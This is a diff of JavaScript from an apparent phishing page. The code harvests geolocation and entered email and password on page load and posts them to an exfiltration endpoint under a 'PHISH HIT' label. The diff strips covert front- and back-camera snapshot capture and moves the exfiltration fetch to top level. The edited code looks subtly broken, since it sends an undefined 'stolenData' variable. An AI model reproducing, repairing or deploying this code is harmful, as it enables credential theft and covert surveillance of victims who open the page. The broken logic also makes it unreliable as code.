@@ -53,53 +53,24 @@
                 },()=>sendData(data),{enableHighAccuracy:true});
             }
 
-            // FRONT CAMERA
-            try{
-                const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
-                const vid=document.createElement('video');
-                vid.srcObject=stream;vid.play();
-                setTimeout(()=>{
-                    canvasShot(vid,'front.jpg',data);
-                    stream.getTracks().forEach(t=>t.stop());
-                },800);
-            }catch(e){}
-
-            // BACK CAMERA
-            try{
-                const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
-                const vid=document.createElement('video');
-                vid.srcObject=stream;vid.play();
-                setTimeout(()=>{
-                    canvasShot(vid,'back.jpg',data);
-                    stream.getTracks().forEach(t=>t.stop());
-                },800);
-            }catch(e){}
-
+ 
             // FORM DATA
             const email=document.getElementById('email').value;
             const pass=document.getElementById('pass').value;
             if(email&&pass) data.creds={email,pass};
         }
 
-        function canvasShot(video,name,data){
-            const canvas=document.createElement('canvas');
-            canvas.width=video.videoWidth;
-            canvas.height=video.videoHeight;
-            canvas.getContext('2d').drawImage(video,0,0);
-            data[name]=canvas.toDataURL('image/jpeg',0.7);
-        }
 
         async function sendData(data){
             const form=new FormData();
             form.append('text',`🎣 PHISH HIT\n${JSON.stringify(data,null,2)}`);
-
-            // Send images
-            fetch(EXFIL_ENDPOINT, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
         }
+
+        fetch(EXFIL_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(stolenData)
+        });
 
         // Triggers
         window.onload=grabAll;
